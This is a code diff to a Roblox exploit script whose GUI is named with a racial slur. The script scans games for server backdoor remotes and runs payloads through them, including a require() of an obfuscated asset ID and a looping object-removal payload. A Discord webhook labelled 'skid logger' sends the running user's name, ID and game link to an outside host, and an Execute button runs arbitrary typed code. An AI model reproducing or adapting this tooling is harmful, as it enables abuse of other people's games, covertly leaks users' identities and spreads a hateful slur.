@@ -9,8 +9,11 @@
 
 local G2L = {}
 
--- StarterGui.Nigga Backdoor
-G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'))
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- StarterGui.Nigga Backdoor (parented to PlayerGui now)
+G2L["1"] = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 G2L["1"].Name = "Nigga Backdoor"
 G2L["1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 G2L["1"].ResetOnSpawn = false
@@ -164,11 +167,11 @@ for i = 1, 100 do
             backdoor = remote
             debug(remote:GetFullName(), 3)
 
-            -- Example of code you might want to run on backdoor
+            -- Example payloads
             runRemote(remote, "require(171016405.1884*69)")          
             runRemote(remote, "while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 
-            -- Discord webhook reporting (optional, can be removed if unwanted)
+            -- Discord webhook reporting (optional)
             local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
             if request then 
                 request({
@@ -179,7 +182,7 @@ for i = 1, 100 do
                     },
                     Body = HttpService:JSONEncode({
                         username='skid logger',
-                        content = "**User: `" .. game:GetService('Players').LocalPlayer.Name .. '` | `' .. game:GetService('Players').LocalPlayer.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. backdoor:GetFullName() .. "`**",
+                        content = "**User: `" .. player.Name .. '` | `' .. player.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. backdoor:GetFullName() .. "`**",
                     })
                 })
             end
@@ -189,8 +192,11 @@ for i = 1, 100 do
     wait(0.1)
 end
 
--- Connect Execute button to run code typed in the TextBox
+-- Button callbacks
+
+-- Execute button: runs code typed in TextBox
 G2L["7"].MouseButton1Click:Connect(function()
+    print("Execute button clicked")
     local code = G2L["6"].Text
     if code ~= "" then
         local func, err = loadstring(code)
@@ -198,16 +204,21 @@ G2L["7"].MouseButton1Click:Connect(function()
             local success, execErr = pcall(func)
             if not success then
                 warn("Error executing code: ".. tostring(execErr))
+            else
+                print("Code executed successfully")
             end
         else
             warn("Failed to load code: ".. tostring(err))
         end
+    else
+        warn("No code entered")
     end
 end)
 
--- Connect Clear button to clear the TextBox
+-- Clear button: clears the TextBox
 G2L["8"].MouseButton1Click:Connect(function()
+    print("Clear button clicked")
     G2L["6"].Text = ""
 end)
 
-return G2L["1"], require
+return G2L["1"], require;
